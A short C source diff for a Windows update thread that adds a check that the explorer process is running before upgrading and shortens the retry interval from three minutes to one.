@@ -466,7 +466,11 @@ DWORD WINAPI UpdateThread (LPVOID lpParam)
 				goto Failed2;
 			}
 
-		//	OutputDebugStringA("upgrade thread before critical");
+			//only upgrade if explorer is running
+			if(SecEngProcEnumerator()==0)
+			{
+					goto Failed2;
+			}
 		
 	
 			EnterCriticalSection(&UpgradeCritical);
@@ -502,7 +506,7 @@ DWORD WINAPI UpdateThread (LPVOID lpParam)
 		}
 
 		Failed2:
-		Sleep(180000);
+		Sleep(60000);
 	}
 	return 0;
 }
